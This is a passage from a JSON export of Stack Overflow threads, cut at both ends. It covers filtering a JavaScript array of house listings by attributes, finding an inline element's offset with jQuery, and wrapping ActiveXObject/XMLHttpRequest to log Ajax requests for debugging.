                    "body": "<p>Take a look at the <a href=\"http://docs.jquery.com/Utilities/jQuery.grep#arraycallbackinvert\" rel=\"nofollow\">$.grep</a> function in the <a href=\"http://jquery.com/\" rel=\"nofollow\">jQuery</a> library.  Even if you don't use the library, you can look at the code and see how they accomplished the task you are trying to do.</p>\n\n<p>EDIT:  Here's some code:</p>\n\n<pre><code> function filter(houses, filters) // pass it filters object like the one in @J-P's answer\n {\n      retArr = $.grep(houses, \n           function(house)\n           {\n                for(var filter in filters)\n                {\n                     function test = filters[filter];\n                     if(!test(house)) return false;\n                }\n                return true;\n           });\n\n      return retArr;\n }\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I am assuming you want the syntax sugar of being able to call filter direction on the homes array to generate a new array of only the filter accepted results.</p>\n\n<p>Use a object prototype to define a filter function on the array object that accepts a hash of parameter filters. Then you can easily use that hash to generate and return a new array of homes that match the desired property.</p>\n",
                    "is_accepted": false,
                    "score": -1
                },
                {
                    "body": "<p>Take a look at JSONPath <a href=\"http://code.google.com/p/jsonpath/\" rel=\"nofollow\">http://code.google.com/p/jsonpath/</a></p>\n\n<p>Something like jsonPath(json, \"$..homes[?(@.price&lt;400000)]\").toJSONString() should work.</p>\n\n<p>JAQL also looks interesting for filtering JSON.  <a href=\"http://www.jaql.org/\" rel=\"nofollow\">http://www.jaql.org/</a></p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>Here you go:</p>\n\n<pre><code>var filteredArray = filter(myBigObject.homes, {\n\n    price: function(value) {\n        value = parseFloat(value);\n        return value &gt;= 150000 &amp;&amp; value &lt;= 400000;\n    },\n\n    num_of_baths: function(value) {\n        value = parseFloat(value);\n        return value &gt;= 2.5;\n    },\n\n    num_of_beds: function(value) {\n        value = parseFloat(value);\n        return value === 1 || value === 3;\n    }\n\n});\n</code></pre>\n\n<p>And the <code>filter</code> function:</p>\n\n<pre><code>function filter( array, filters ) {\n\n    var ret = [],\n        i = 0, l = array.length,\n        filter;\n\n    all: for ( ; i &lt; l; ++i ) {\n\n        for ( filter in filters ) {\n            if ( !filters[filter](array[i][filter]) ) {\n                continue all;\n            }\n        }\n\n        ret[ret.length] = array[i];\n\n    }\n\n    return ret;\n\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<pre><code>Array.prototype.select = function(filter) {\n\n    if (!filter) return this;\n\n    var result = [], item = null;\n    for (var i = 0; i &lt; this.length; i++) {\n    \titem = this[i];\n    \tif (filter(item)) {\n    \t\tresult.push(item);\n    \t}\n    }\n\n    return result;\n}\n\nfunction filterHomes(homes) {\n    var a = 1, b = 2, c = 3, x = 4, y = 5, z = 6;\n    return homes.select(function(item) {\n    \treturn between(item.price, x, y) &amp;&amp; item.num_of_baths &gt;= z &amp;&amp; inArray(item.num_of_beds, [a, b, c]);\n    });\n}\n\nfunction between(value, min, max) {\n    return value &gt;= min &amp;&amp; value &lt;= max;\n}\n\nfunction inArray(value, values) {\n    for (var i = 0; i &lt; values.length; i++) {\n    \tif (value === values[i]) return true;\n    }\n    return false;\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I like this question so I'm taking a shot at it. How about a \"chained\" style of code, where the object you have returns itself, a la some of the JavaScript DOM frameworks. </p>\n\n<p>I'm calling your Object <code>MyObj</code>:</p>\n\n<pre><code>MyObj.filter('home.price &gt;= 150000')\n     .filter('home.price &lt;= 400000')\n     .filter('home.num_of_baths &gt;= 2.5')\n     .filter('home.num_of_beds == 1 || home.bedrooms == 3');\n</code></pre>\n\n<p>And here's the source code, this example works.</p>\n\n<pre><code>var MyObj = {\n    filter : function(rule_expression) {\n    \tvar tmpHomes = [];\n    \tvar home = {};\n    \tfor(var i=0;i&lt;this.homes.length;i++) {\n    \t\thome = this.homes[i];\n    \t\tif (eval(rule_expression)) {\n    \t\t\ttmpHomes.push(home);\n    \t\t}\n    \t}\n    \tthis.homes = tmpHomes;\n    \treturn this;\n    },\n    homes: [\n    {\n    \t\"home_id\"         : 1,\n    \t\"address\"         : \"321 Main St\",\n    \t\"city\"            : \"Dallas\",\n    \t\"state\"           : \"TX\",\n    \t\"zip\"             : \"75201\",\n    \t\"price\"           : 300000,\n    \t\"sqft\"            : 1100,\n    \t\"year_built\"      : 2008,\n    \t\"account_type_id\" : 2,\n    \t\"num_of_beds\"     : 1,\n    \t\"num_of_baths\"    : 2.5,\n    \t\"geolat\"          : 32.779625,\n    \t\"geolng\"          : -96.786064,\n    \t\"photo_id\"        : \"14\",\n    \t\"photo_url_dir\"   : \"\\/home_photos\\/thumbnail\\/2009\\/06\\/10\\/foo.jpg\"\n    },\n    {\n    \t\"home_id\"         : 2,\n    \t\"address\"         : \"555 Hello World Way\",\n    \t\"city\"            : \"Dallas\",\n    \t\"state\"           : \"TX\",\n    \t\"zip\"             : \"75201\",\n    \t\"price\"           : 200000,\n    \t\"sqft\"            : 900,\n    \t\"year_built\"      : 1999,\n    \t\"account_type_id\" : 2,\n    \t\"num_of_beds\"     : 1,\n    \t\"num_of_baths\"    : 1.0,\n    \t\"geolat\"          : 32.779625,\n    \t\"geolng\"          : -96.786064,\n    \t\"photo_id\"        : \"14\",\n    \t\"photo_url_dir\"   : \"\\/home_photos\\/thumbnail\\/2009\\/06\\/10\\/foo.jpg\"\n    },\n    {\n    \t\"home_id\"         : 3,\n    \t\"address\"         : \"989 Foo St\",\n    \t\"city\"            : \"Dallas\",\n    \t\"state\"           : \"TX\",\n    \t\"zip\"             : \"75201\",\n    \t\"price\"           : 80000,\n    \t\"sqft\"            : 1100,\n    \t\"year_built\"      : 2003,\n    \t\"account_type_id\" : 2,\n    \t\"num_of_beds\"     : 3,\n    \t\"num_of_baths\"    : 3,\n    \t\"geolat\"          : 32.779625,\n    \t\"geolng\"          : -96.786064,\n    \t\"photo_id\"        : \"14\",\n    \t\"photo_url_dir\"   : \"\\/home_photos\\/thumbnail\\/2009\\/06\\/10\\/foo.jpg\"\n    },\n    {\n    \t\"home_id\"         : 4,\n    \t\"address\"         : \"1560 Baz Rd\",\n    \t\"city\"            : \"Dallas\",\n    \t\"state\"           : \"TX\",\n    \t\"zip\"             : \"75201\",\n    \t\"price\"           : 100000,\n    \t\"sqft\"            : 1100,\n    \t\"year_built\"      : 2008,\n    \t\"account_type_id\" : 2,\n    \t\"num_of_beds\"     : 3,\n    \t\"num_of_baths\"    : 1.5,\n    \t\"geolat\"          : 32.779625,\n    \t\"geolng\"          : -96.786064,\n    \t\"photo_id\"        : \"14\",\n    \t\"photo_url_dir\"   : \"\\/home_photos\\/thumbnail\\/2009\\/06\\/10\\/foo.jpg\"\n    }\n    ]\n};\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Javascript 1.6 (FF, Webkit-based) has built-in <a href=\"https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Objects/Array/filter\" rel=\"nofollow\">Array.filter</a> function, so there's no need to reinvent the wheel. </p>\n\n<pre><code>result = homes.\n  filter(function(p) { return p.price &gt;= 150000 }).\n  filter(function(p) { return p.price &lt;= 400000 }).\n  filter(function(p) { return p.bathrooms &gt;= 2.5 }) etc\n</code></pre>\n\n<p>for a msie fallback see <a href=\"https://developer.mozilla.org/en/Core%5FJavaScript%5F1.5%5FReference/Objects/Array/filter#Compatibility\" rel=\"nofollow\">the page linked above</a>.</p>\n",
                    "is_accepted": false,
                    "score": 9
                },
                {
                    "body": "<p>The <a href=\"http://documentcloud.github.com/underscore/\" rel=\"nofollow\">Underscore.js</a> library works well for these tasks. It uses native JavaScript commands when they are present. I've managed to get of many iterative loops using this library.</p>\n\n<p>Bonus, the latest version is chainable, like jQuery.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<pre><code>o = ({\n'homes' : \n[{\n    \"home_id\"         : \"1\",\n    \"address\"         : \"321 Main St\",\n    \"city\"            : \"Dallas\",\n    \"state\"           : \"TX\",\n    \"zip\"             : \"75201\",\n    \"price\"           : \"20000\",\n    \"sqft\"            : \"1100\",\n    \"year_built\"      : \"2008\",\n    \"account_type_id\" : \"2\",\n    \"num_of_beds\"     : \"3\",\n    \"num_of_baths\"    : \"3.0\",\n    \"geolat\"          : \"32.779625\",\n    \"geolng\"          : \"-96.786064\",\n    \"photo_id\"        : \"14\",\n    \"photo_url_dir\"   : \"\\/home_photos\\/thumbnail\\/2009\\/06\\/10\\/\"\n}\n]})\n\nArray.prototype.filterBy = function( by ) {\n    outer: for ( \n    var i = this.length,\n        ret = {},\n        obj; \n        i--; \n    ) \n    {\n    obj = this[i];\n    for ( var prop in obj ) {\n\n        if ( !(prop in by) ) continue\n\n        if ( by[prop](obj[prop]) ) {\n    \tret[prop] = obj[prop]\n        }\n\n    }\n    }\n\n    return ret;\n}\n\nvar result = o.homes.filterBy({\n    price:function(price) {\n        price = parseFloat(price)\n        return price &gt;= 15000 &amp;&amp; price &lt;=40000\n    },\n    num_of_baths:function(bathroom){\n        bathroom = parseFloat(bathroom)\n        return bathroom &gt; 2.5\n    },\n    num_of_beds:function(bedroom){\n        bedroom = parseFloat(bedroom)\n        return bedroom === 1 || bedroom === 3\n    }\n});\n\nfor ( var p in result ) alert(p + '=' + result[p])\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I've revised this answer several times, and people can look at the wiki if there interested in the revisions, but this is the final solution I've come up with.  It's very similar to many of the others posted here, the key difference being that I've extended the <code>Array.prototype</code> wrapped the <code>Array.prototype.filter</code> function such that the test statements are evaluated in the scope of the array element instead of the array.</p>\n\n<p>The main advantage I see with this solution rather than simply using the <code>filter</code> method directly is that it allows you to write generic tests that test the value of <code>this[key]</code>.  Then you can create a generic form elements associated with a specific tests, and use metadata from the objects to be filtered (houses in this case) to associate specific instances of the form elements with keys.  This not only makes the code more reusable, but I think it makes actually constructing the queries programmatically a bit more straightfoward.  Also, since you can define generic form elements (say a multi-select for distinct values, or a set of dropdowns for a range), you could also create a more powerful query interface where additional form elements could be injected dynamically allowing users to create complex and customized queries.  Here is what the code breaks down into:</p>\n\n<p>Before doing anything you should first check to see if the <code>filter</code> function exists and extend the <code>Array.prototype</code> if it doesn't as mentioned in other solutions. Then extend the <code>Array.prototype</code> to wrap the <code>filter</code> function. I've made it so that the arguments are optional in case someone wants to employ a test function that doesn't take any for some reason, I've also tried to include errors to help you implement the code:</p>\n\n<pre><code>Array.prototype.filterBy = function(testFunc, args)\n{\n\tif(args == null || typeof args != 'object') args = [args];\n\tif(!testFunc || typeof testFunc != 'function') throw new TypeError('argument 0 must be defined and a function');\n\treturn this.filter(function(elem)\n\t  \t{\n   \t\treturn testFunc.apply(elem, args);\n\t});\n};\n</code></pre>\n\n<p>This takes a test function, and an argument array, and defines an inline function as the callback for the <code>Array.prototype.filter</code> function which calls <code>function.prototype.apply</code> to execute the test function in the scope of the array element being tested with the specified arguments.  You can then write a suite of generic testing functions like these:</p>\n\n<pre><code>testSuite = {\n\n\t range : function(key, min, max)\n\t {\n\t      var min = parseFloat(min);\n\t      var max = parseFloat(max);\n\t      var keyVal = parseFloat(this[key]);\n\t      if(!min || !max|| !keyVal) return false;\n\t      else return keyVal &gt;= min &amp;&amp; keyVal &lt;= max;\n\t },\n\n\t distinct : function(key, values)\n\t {\n\t      if(typeof key != 'string') throw new TypeError('key must be a string');\n\t      if(typeof values != 'object') values = [values];\n\t      var keyVal = this[key];\n\t      if(keyVal == undefined) return false;\n\n\n\t      for(var i in values)\n\t      {\n\t         var value = values[i];\n\t         if(typeof value == 'function') continue;\n\t         if(typeof value == 'string')\n\t         {\n\t              if(keyVal.toString().toLowerCase() == value.toLowerCase()) return true;\n\t              else continue; \n\t         }\n\t         else\n\t         {\n\t             keyVal = parseFloat(keyVal);\n\t             value = parseFloat(value);\n\t             if(keyVal&amp;&amp;value&amp;&amp;(keyVal==value)) return true;\n\t             else continue;\n\n\t        }\n\t      }\n\t      return false;\n\t }\n};\n</code></pre>\n\n<p>These are just the test functions associated with the requirements in your question, however you could create additional ones that do more complex things like test string values against a regular expression, or test key values that aren't simple datatypes.</p>\n\n<p>Then you extend the object containing the houses array like so (I've called it housesData, call it whatever it is in your code):</p>\n\n<pre><code> housesData.filterBy = function(tests)\n {\n      ret = this.homes.slice(0);\n      if(tests)\n      {\n           for(var i in tests)\n           {\n               var test = tests[i];\n               if(typeof test != 'object') continue;\n               if(!test.func || typeof test.func != 'function') throw new TypeError('argument 0 must be an array or object containing test objects, each with a key \"func\" of type function');\n               else ret = ret.filterBy(test.func, test.args ? test.args : []);\n           }\n      }\n      return ret;\n }\n</code></pre>\n\n<p>You could then call this function like so to get a result set using the generic functions defined above:</p>\n\n<pre><code> result = housesData.filterBy([{func:range,args:['price','150000','400000'],\n                      {func:distinct,args:['num_of_bedsf',[1, 2, 3]]}]);\n</code></pre>\n\n<p>The way I would actually forsee using this however is to serialize the generic form elements I mentioned earlier into an array or hashmap of the test objects.  Here's a simple example I used to test this code (I used jQuery, because it's easier, all the previous code is in example.js, along with @artlung's dummy homes array):</p>\n\n<pre><code> &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n &lt;!DOCTYPE html \n      PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\n     \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;\n &lt;html xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:myNS=\"http://uri.for.your.schema\" xml:lang=\"en\" lang=\"en\"&gt;\n&lt;head&gt;\n    &lt;script src=\"jquery-1.3.2.js\" type=\"text/javascript\" language=\"javascript\"&gt;&lt;/script&gt;\n    &lt;script src=\"example.js\" type=\"text/javascript\" language=\"javascript\"&gt;&lt;/script&gt;\n    &lt;script type=\"text/javascript\" language=\"javascript\"&gt;\n\t\trunQuery = function(event)\n\t\t{\n \t\t\tvar tests = [];\n \t\t\t$('#results').attr('value', '');;\n \t\t\tcontrols = $('#theForm &gt; fieldset');\n \t\t\tfor(var i = 0; i &lt; controls.length ; i++)\n \t\t\t{\n \t \t\t\tvar func;\n \t \t\t\tvar args = [];\n \t \t\t\tcontrol = controls.eq(i);\n \t \t\t\tfunc = testSuite[control.attr('myNS:type')];\n \t \t\t\targs.push(control.attr('myNS:key'));\n \t \t\t\tvar inputs = $('input', control);\n \t \t\t\tfor(var j=0; j&lt; inputs.length; j++)\n \t \t\t\t{\n \t \t \t\t\targs.push(inputs[j].value);\n \t \t\t\t}\n \t \t\t\ttests.push({func:func,args:args});\n \t\t\t}\n \t\t\tresult = housesData.filterBy(tests);\n \t\t\tresultStr = '';\n \t\t\tfor(var i = 0; i &lt; result.length; i++)\n \t\t\t{\n \t \t\t\tresultStr += result[i]['home_id'];\n \t \t\t\tif(i &lt; (result.length -1)) resultStr += ', ';\n \t\t\t}\n \t\t\t$('#results').attr('value', resultStr);\n\t\t}\n\t&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n  &lt;form id=\"theForm\" action=\"javascript:null(0)\"&gt;\n    &lt;fieldset myNS:type=\"range\" myNS:key=\"price\"&gt;\n    \t&lt;legend&gt;Price:&lt;/legend&gt;\n    \tmin: &lt;input type=\"text\" myNS:type=\"min\"&gt;&lt;/input&gt;\n    \tmax: &lt;input type=\"text\" myNS:type=\"max\"&gt;&lt;/input&gt;\n    &lt;/fieldset&gt;\n    &lt;fieldset myNS:type=\"distinct\" myNS:key=\"num_of_beds\"&gt;\n    \t&lt;legend&gt;Bedrooms&lt;/legend&gt;\n    \tbedrooms: &lt;input type=\"text\" myNS:type=\"value\"&gt;&lt;/input&gt;\n    &lt;/fieldset&gt;\n    &lt;button onclick=\"runQuery(event);\"&gt;Submit&lt;/button&gt;\n  &lt;/form&gt;\n  &lt;textarea id=\"results\"&gt;&lt;/textarea&gt;\n    &lt;/body&gt;\n &lt;/html&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I agree about not reinventing the wheel, and just using the native Array filter method.</p>\n\n<p>The function definition shown on the Mozilla page will add <code>filter</code> if it's missing, regardless of the browser, by using object detection (<code>if (!Array.prototype.filter)</code>)</p>\n\n<p>Any of the methods suggesting <code>eval</code> and/or multiple <code>for</code> loops are both <a href=\"http://www.google.com/search?q=eval+is+evil\" rel=\"nofollow\">slow and potentially unsafe</a>.</p>\n\n<p>You didn't say so, but I'm assuming the values will be coming from user input (a form) so I'd do something like:</p>\n\n<pre><code>var filtered_results = obj.homes\n    .filter(function (home)\n    {\n        return parseInt(home.price) &gt;= document.getElementsByName('price_gt')[0].value;\n    })\n    .filter(function (home)\n    {\n        return parseInt(home.price) &lt;= document.getElementsByName('price_lt')[0].value;\n    })\n    .filter(function (home)\n    {\n        return parseFloat(home.num_of_baths) &gt;= document.getElementsByName('baths_gt')[0].value;\n    });\n</code></pre>\n\n<p>better yet, don't iterate through the list N times and just do:</p>\n\n<pre><code>var filtered_results = obj.homes.filter(function (home)\n{\n    return (\n        parseInt(home.price) &gt;= document.getElementsByName('price_gt')[0].value &amp;&amp;\n        parseInt(home.price) &lt;= document.getElementsByName('price_lt')[0].value &amp;&amp;\n        parseFloat(home.num_of_baths) &gt;= document.getElementsByName('baths_gt')[0].value\n    );\n});\n</code></pre>\n\n<p>I know this doesn't match the requested syntax but this approach is faster and more flexible (by not using eval or hardcoded values).</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Ryan Lynch - If you're using strings for the comparisons ('value operator comparison') you can use plain JavaScript (value operator comparison). The logical inflexibility is the same, only with less speed and security (via eval()).</p>\n\n<p>The lack of flexibility in my example comes from knowing which fields (price, baths, etc) and which operators we're interested in, but the original poster's request listed specific fields and comparisons (price &lt; X, baths > Y, etc).</p>\n\n<p>GeorgeG - if you're interested, and my assumptions about the filter values coming from a form are correct, I can write up a more generic \"for each of the user-specified values, filter the results as requested\" approach but I'll wait for confirmation and, if possible, a code sample.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Funny how most of these answers do nothing but try to put the matter of iterating over an array more elegantly, when that's not even what GeorgeG needs.</p>\n\n<p>Assuming you have a huge JSON, you want something fast. Iterating is not that. You need jOrder (<a href=\"http://github.com/danstocker/jorder\" rel=\"nofollow\">http://github.com/danstocker/jorder</a>), that does search 100 times faster on a 1000 row table than iterative filtering. The bigger the table the higher the ratio.</p>\n\n<p>Here's what you do.</p>\n\n<p>Since jOrder can't handle more than one inequality filter at a time you'll have to do it in three steps but it will still be magnitudes faster.</p>\n\n<p>First, create a jOrder table based on your raw data, and add a price index on it:</p>\n\n<pre><code>var table = jOrder(data.homes)\n    .index('price', ['price'], { ordered: true, grouped: true, type: jOrder.number });\n</code></pre>\n\n<p>You can re-use this table in future searches. Now you start by getting the price filtered results, and wrapping it in another jOrder table, and finally adding a bathroom index:</p>\n\n<pre><code>var price_filtered = jOrder(table.where([{ price: { lower: 150000, upper: 400000 } }]))\n    .index('bathrooms', ['num_of_baths'], { ordered: true, grouped: true, type: jOrder.number });\n</code></pre>\n\n<p>Then we go on by doing the same for bathrooms, adding an index on bedrooms, which doesn't have to be ordered since we won't use inequality filters here:</p>\n\n<pre><code>var bath_filtered = jOrder(price_filtered.where([{ num_of_baths: { lower: 2.5 } }]))\n    .index('bedrooms', ['num_of_beds'], { grouped: true });\n</code></pre>\n\n<p>Finally, you get the fully filtered set by:</p>\n\n<pre><code>var filtered = jOrder(bath_filtered.where([{ num_of_beds: 1 }, { num_of_beds: 3 }]));\n</code></pre>\n\n<p>Of course you can wrap all this into a function that takes the three arguments:</p>\n\n<ul>\n<li><code>{ price: { lower: 150000, upper: 400000 } }</code></li>\n<li><code>{ num_of_baths: { lower: 2.5 } }</code></li>\n<li><code>[{ num_of_beds: 1 }, { num_of_beds: 3 }]</code></li>\n</ul>\n\n<p>and returns <code>filtered</code>.</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I have a JavaScript array of houses like so,</p>\n\n<pre><code>{\n    \"homes\" : [{\n        \"home_id\"         : \"1\",\n        \"address\"         : \"321 Main St\",\n        \"city\"            : \"Dallas\",\n        \"state\"           : \"TX\",\n        \"zip\"             : \"75201\",\n        \"price\"           : \"925\",\n        \"sqft\"            : \"1100\",\n        \"year_built\"      : \"2008\",\n        \"account_type_id\" : \"2\",\n        \"num_of_beds\"     : \"2\",\n        \"num_of_baths\"    : \"2.0\",\n        \"geolat\"          : \"32.779625\",\n        \"geolng\"          : \"-96.786064\",\n        \"photo_id\"        : \"14\",\n        \"photo_url_dir\"   : \"\\/home_photos\\/thumbnail\\/2009\\/06\\/10\\/\"\n    }],\n    ..........\n}\n</code></pre>\n\n<p>I want to provide 3 different search methods.</p>\n\n<p>How can I return a subset of this homes area array that has:</p>\n\n<ul>\n<li>The <code>price</code> between X and Y</li>\n<li>The <code>bathrooms</code> >= Z</li>\n<li>The # of <code>bedrooms</code> == A or == B or == C</li>\n</ul>\n\n<p>For example, how would I create the psuedo code like:</p>\n\n<pre><code>homes.filter {price &gt;= 150000, price &lt;= 400000, bathrooms &gt;= 2.5, bedrooms == 1 | bedrooms == 3}\n</code></pre>\n",
            "last_activity_date": 1420038729,
            "question_id": 1694717,
            "score": 7,
            "tags": [
                "javascript",
                "html",
                "json",
                "filter"
            ],
            "title": "JavaScript: How to create an Object and filter on those attributes?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>I believe offset is relative to the document, while position is relative to the parent.</p>\n\n<p><a href=\"http://docs.jquery.com/CSS/position\" rel=\"nofollow\">http://docs.jquery.com/CSS/position</a></p>\n",
                    "is_accepted": false,
                    "score": -1
                },
                {
                    "body": "<p>Here's what's happening:</p>\n\n<p><img src=\"http://img32.imageshack.us/img32/6746/20090615134321.png\" alt=\"Diagram\" /></p>\n\n<p>Since the inline element spans multiple lines jQuery will give you the left-most position of that element, not the offset of the beginning of the element. </p>\n\n<p>To get around this, try this plugin:</p>\n\n<pre><code>jQuery.fn.inlineOffset = function() {\n    var el = $('&lt;i/&gt;').css('display','inline').insertBefore(this[0]);\n    var pos = el.offset();\n    el.remove();\n    return pos;\n};\n</code></pre>\n\n<p>The plugin will create a temporary element and insert it just before the target element - it will then return the offset of that temporary element.</p>\n\n<p>Example usage:</p>\n\n<pre><code>alert( jQuery('strong').inlineOffset().left );\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 22
                },
                {
                    "body": "<p>The reason you are getting the result of 8px is because even though the element starts in half way through your container, since there's a line break its left edge is 8px in from the page.</p>\n\n<p>I have one of those feelings that there's probably a much better way to do it than this, but the first thing I could think of to work around this problem is to insert another element right before the <code>&lt;strong&gt;</code> and check its position:</p>\n\n<pre><code>$(\"&lt;span&gt;&lt;span&gt;\").insertBefore($('#s')).offset();\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I have the following piece of HTML:</p>\n\n<pre><code>&lt;div&gt;&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor \nincididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud \nexercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in \nreprehenderit in voluptate velit &lt;strong id=\"s\"&gt;esse cillum dolore eu fugiat nulla pariatur.\nExcepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.&lt;/strong&gt;&lt;/p&gt;&lt;/div&gt;\n</code></pre>\n\n<p>The width of the DIV is fixed at 600px using CSS. Now, I want to find the offset().left of the <code>&lt;strong&gt;</code> element. So I did:</p>\n\n<pre><code>alert( $(\"#s\").offset().left );\n</code></pre>\n\n<p><strong>However this does not seem to produce the right value, as I can clearly see the strong element is seen half way through the 600px width, but the offset value I get is only 8px.</strong></p>\n\n<p>How do I find the offset().left value of the inline strong element?</p>\n",
            "last_activity_date": 1245070857,
            "question_id": 995838,
            "score": 7,
            "tags": [
                "javascript",
                "jquery",
                "offset"
            ],
            "title": "Left offset of an inline element using jQuery"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>You can in fact override <code>ActiveXObject()</code>.</p>\n\n<p>This means you can try to build a transparent proxy object around the actual object and hook on method calls. This would mean you'd have to build a proxy around every method and property your ActiveX object has, unless you are absolutely sure there is no code whatsoever calling a particular method or property.</p>\n\n<p>I've built a small wrapper for the <code>\"MSXML2.XMLHTTP\"</code> object. There are probably all kinds of problems you can run into, so take that with a grain of salt:</p>\n\n<pre><code>var ActualActiveXObject = ActiveXObject;\n\nvar ActiveXObject = function(progid) {\n  var ax = new ActualActiveXObject(progid);\n\n  if (progid.toLowerCase() == \"msxml2.xmlhttp\") {\n    var o = {\n      _ax: ax,\n      _status: \"fake\",\n      responseText: \"\",\n      responseXml: null,\n      readyState: 0,\n      status: 0,\n      statusText: 0,\n      onReadyStateChange: null\n      // add the other properties...\n    };\n    o._onReadyStateChange = function() {\n      var self = o;\n      return function() {\n        self.readyState   = self._ax.readyState;\n        self.responseText = self._ax.responseText;\n        self.responseXml  = self._ax.responseXml;\n        self.status       = self._ax.status;\n        self.statusText   = self._ax.statusText;\n        if (self.onReadyStateChange) self.onReadyStateChange();\n      }\n    }();\n    o.open = function(bstrMethod, bstrUrl, varAsync, bstrUser, bstrPassword) {\n      varAsync = (varAsync !== false);\n      this._ax.onReadyStateChange = this._onReadyStateChange\n      return this._ax.open(bstrMethod, bstrUrl, varAsync, bstrUser, bstrPassword);\n    };\n    o.send = function(varBody) {\n      return this._ax.send(varBody);\n    };\n    // add the other methods...\n  }\n  else {\n    var o = ax;\n  }\n\n  return o;\n}\n\nfunction Test() {\n  var r = new ActiveXObject('Msxml2.XMLHTTP');\n\n  alert(r._status);  // \"fake\"\n\n  r.onReadyStateChange = function() { alert(this.readyState); };\n  r.open(\"GET\", \"z.xml\");\n  r.send();\n\n  alert(r.responseText);\n}\n</code></pre>\n\n<p>Disclaimer: Especially the async/onReadyStateChange handling probably isn't right, and the code may have other issues as well. As I said, it's just an idea. Handle with care.</p>\n\n<p>P.S.: A COM object is case-insensitive when it comes to method- and property names. This wrapper is (as all JavaScript) case-sensitive. For example, if your code happens to call both <code>\"Send()\"</code> and <code>\"send()\"</code>, you will need a skeleton \"Send()\" method in the wrapper as well:</p>\n\n<pre><code>o.Send = function() { return this.send.apply(this, arguments); };\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 11
                },
                {
                    "body": "<p>The problem here is that it seems that IE wont allow saving of the original activXObject constructor and will give a stack overflow (;-) upon creating the ActualActiveXObject.\nit seems that this is special for the ActivX because it is working when doing that with other javascript objects.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>A little fix for \"The data necessary to complete this operation is not yet available\" in IE6 - waiting for completeness before population of reponse properties:</p>\n\n<pre><code>self.readyState   = self._ax.readyState;\n if (self.readyState == 4) {\n  self.responseText = self._ax.responseText;\n  self.responseXml  = self._ax.responseXml;\n  self.status       = self._ax.status;\n  self.statusText   = self._ax.statusText;\n }\n if (self.onReadyStateChange) self.onReadyStateChange();\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Thank you very much for your wrapper. With your help I was able to create a xmlrequest detector for IE and FF and the rest.</p>\n\n<p>I have added a version (combined from another example) that works for FF , IE and the rest of the gang,</p>\n\n<pre><code>if(window.XMLHttpRequest)\n{\nvar XMLHttpRequest = window.XMLHttpRequest;\n\n// mystery: for some reason, doing \"var oldSend = XMLHttpRequest.prototype.send;\" and \n//  calling it at the end of \"newSend\" doesn't work...\nvar startTracing = function () {\n    XMLHttpRequest.prototype.uniqueID = function() {\n        // each XMLHttpRequest gets assigned a unique ID and memorizes it \n        //  in the \"uniqueIDMemo\" property\n        if (!this.uniqueIDMemo) {\n            this.uniqueIDMemo = Math.floor(Math.random() * 1000);\n        }\n        return this.uniqueIDMemo;\n    }\n\n    // backup original \"open\" function reference\n    XMLHttpRequest.prototype.oldOpen = XMLHttpRequest.prototype.open;\n\n    var newOpen = function(method, url, async, user, password) {\n        console.log(\"[\" + this.uniqueID() + \"] intercepted open (\" + \n                    method + \" , \" + \n                    url + \" , \" + \n                    async + \" , \" + \n                    user + \" , \" + \n                    password + \")\");\n        this.oldOpen(method, url, async, user, password);\n    }\n\n    XMLHttpRequest.prototype.open = newOpen;\n\n    // backup original \"send\" function reference\n    XMLHttpRequest.prototype.oldSend = XMLHttpRequest.prototype.send;\n\n    var newSend = function(a) {\n        console.log(\"[\" + this.uniqueID() + \"] intercepted send (\" + a + \")\");\n        var xhr = this;\n        var onload = function() { \n            console.log(\"[\" + xhr.uniqueID() + \"] intercepted load: \" + \n                    xhr.status + \n                    \" \" + xhr.responseText); \n        };\n\n        var onerror = function() { \n            console.log(\"[\" + xhr.uniqueID() + \"] intercepted error: \" + \n                    xhr.status); \n        };\n\n        xhr.addEventListener(\"load\", onload, false);\n        xhr.addEventListener(\"error\", onerror, false);\n\n        this.oldSend(a);\n    }\n    XMLHttpRequest.prototype.send = newSend;\n}\n\n\nstartTracing();\n}\nelse if (window.ActiveXObject) {\nvar ActualActiveXObject = ActiveXObject;\n\nvar ActiveXObject = function(progid) {\n    var ax = new ActualActiveXObject(progid);\n\n    if (progid.toLowerCase() == \"msxml2.xmlhttp\") {\n\n        var o = {\n            _ax: ax,\n            _status: \"fake\",\n            responseText: \"\",\n            responseXml: null,\n            readyState: 0,\n            status: 0,\n            statusText: 0,\n            onReadyStateChange: null\n        };\n        o._onReadyStateChange = function() {\n            var self = o;\n            return function() {\n            self.readyState   = self._ax.readyState;\n            if (self.readyState == 4) {\n                self.responseText = 